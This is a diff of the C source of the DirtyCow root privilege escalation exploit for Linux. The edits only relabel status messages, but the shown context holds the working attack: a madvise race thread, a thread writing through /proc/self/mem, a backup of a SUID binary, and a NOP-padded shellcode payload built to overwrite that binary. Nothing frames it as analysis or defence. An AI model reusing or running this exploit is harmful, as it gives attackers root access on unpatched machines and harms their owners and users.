@@ -249,7 +249,7 @@ void *madviseThread(void *arg)
     for(i=0;i<1000000 && !stop;i++) {
         c+=madvise(map,100,MADV_DONTNEED);
     }
-    printf("thread stopped\n");
+    printf("[-] thread stopped\n");
 }
 
 void *procselfmemThread(void *arg)
@@ -262,7 +262,7 @@ void *procselfmemThread(void *arg)
         lseek(f,(off_t)map,SEEK_SET);
         c+=write(f, str, sc_len);
     }
-    printf("thread stopped\n");
+    printf("[-] thread stopped\n");
 }
 
 void *waitForWrite(void *arg) {
@@ -327,8 +327,8 @@ int dirtycow_run() {
     char *backup;
 	// change if no permissions to read
 
-    printf("DirtyCow root privilege escalation\n");
-    printf("Backing up %s to /tmp/bak\n", suid_binary);
+    printf("[+] DirtyCow root privilege escalation\n");
+    printf("[+] Backing up %s to /tmp/bak\n", suid_binary);
 
     asprintf(&backup, "cp %s /tmp/bak", suid_binary);
     system(backup);
@@ -336,15 +336,13 @@ int dirtycow_run() {
     int f = open(suid_binary,O_RDONLY);
     stat(suid_binary,&st);
 
-    printf("Size of binary: %d\n", st.st_size);
-
     char payload[st.st_size];
     memset(payload, 0x90, st.st_size);
     memcpy(payload, sc, sc_len+1);
 
     map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
 
-    printf("Racing, this may take a while..\n");
+    printf("[+] Racing, this may take a while..\n");
 
 	pthread_t pth1,pth2,pth3;
     pthread_create(&pth1, NULL, &madviseThread, suid_binary);
